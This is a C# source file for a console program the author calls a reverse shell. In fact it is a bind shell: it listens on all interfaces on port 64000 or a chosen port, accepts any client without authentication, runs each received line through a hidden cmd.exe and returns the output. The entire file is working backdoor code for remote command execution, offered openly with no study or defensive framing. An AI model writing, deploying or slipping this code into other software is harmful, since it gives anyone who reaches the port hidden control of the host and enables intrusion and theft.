using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace ReverseShellConsoleApp3
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int port = 64000;
            
            if (args.Length > 0 && int.TryParse(args[0], out int customPort))
            {
                port = customPort;
            }

            StartTcpListener(port);
        }

        static void StartTcpListener(int port)
        {
            TcpListener listener = null;

            try
            {
                listener = new TcpListener(IPAddress.Any, port);
                listener.Start();
                Console.WriteLine($"[*] TCP Listener started on port {port}");
                Console.WriteLine("[*] Waiting for connection...");

                while (true)
                {
                    TcpClient client = listener.AcceptTcpClient();
                    Console.WriteLine($"[+] Client connected from {((IPEndPoint)client.Client.RemoteEndPoint).Address}");

                    HandleClient(client);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error: {ex.Message}");
            }
            finally
            {
                listener?.Stop();
            }
        }

        static void HandleClient(TcpClient client)
        {
            NetworkStream stream = client.GetStream();
            byte[] buffer = new byte[4096];
            
            try
            {
                SendMessage(stream, "Connected to reverse shell. Type 'exit' to disconnect.\n");

                while (client.Connected)
                {
                    SendMessage(stream, "cmd> ");

                    int bytesRead = stream.Read(buffer, 0, buffer.Length);
                    if (bytesRead == 0)
                        break;

                    string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                    
                    if (string.IsNullOrWhiteSpace(command))
                        continue;

                    Console.WriteLine($"[*] Executing: {command}");

                    if (command.ToLower() == "exit")
                    {
                        SendMessage(stream, "Goodbye!\n");
                        break;
                    }

                    string output = ExecuteCommand(command);
                    SendMessage(stream, output);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Client error: {ex.Message}");
            }
            finally
            {
                stream?.Close();
                client?.Close();
                Console.WriteLine("[*] Client disconnected");
            }
        }

        static string ExecuteCommand(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();

                    StringBuilder result = new StringBuilder();
                    if (!string.IsNullOrEmpty(output))
                        result.Append(output);
                    if (!string.IsNullOrEmpty(error))
                        result.Append(error);

                    return result.Length > 0 ? result.ToString() : "Command executed successfully (no output)\n";
                }
            }
            catch (Exception ex)
            {
                return $"Error executing command: {ex.Message}\n";
            }
        }

        static void SendMessage(NetworkStream stream, string message)
        {
            byte[] data = Encoding.UTF8.GetBytes(message);
            stream.Write(data, 0, data.Length);
            stream.Flush();
        }
    }
}
